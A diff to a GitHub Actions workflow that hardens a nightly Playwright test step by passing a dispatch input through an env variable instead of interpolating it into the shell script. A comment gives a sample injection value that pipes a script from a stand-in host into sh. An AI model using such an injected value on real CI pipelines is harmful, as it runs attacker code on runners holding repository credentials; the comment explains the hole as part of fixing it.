@@ -74,9 +74,17 @@ jobs:
       # an empty-but-TRUTHY array — which skipped every chapter and still reported green. Both ends
       # are fixed; belt and braces, because a nightly that silently tests nothing is worse than none.
       - name: Every chapter opens (70 chapters x 3 frames)
+        # ⚠️ THE INPUT ARRIVES VIA `env:`, NEVER INTERPOLATED INTO THE SCRIPT. `${{ }}` is expanded
+        # by Actions BEFORE bash sees the line, so `${{ github.event.inputs.only }}` pastes the raw
+        # value into the shell as code — an input of `"; curl evil.sh | sh; #` runs on the runner.
+        # Through `env:` the value is data bash reads from a variable, and quoting does the rest.
+        # Only a collaborator can dispatch this, so it is hardening rather than an open hole; it is
+        # two lines, and this runner has repo-scoped credentials in the same workflow file.
+        env:
+          ONLY_INPUT: ${{ github.event.inputs.only }}
         run: |
-          if [ -n "${{ github.event.inputs.only }}" ]; then
-            export E2E_ONLY="${{ github.event.inputs.only }}"
+          if [ -n "$ONLY_INPUT" ]; then
+            export E2E_ONLY="$ONLY_INPUT"
           fi
           npx playwright test e2e/all-chapters.spec.ts
 
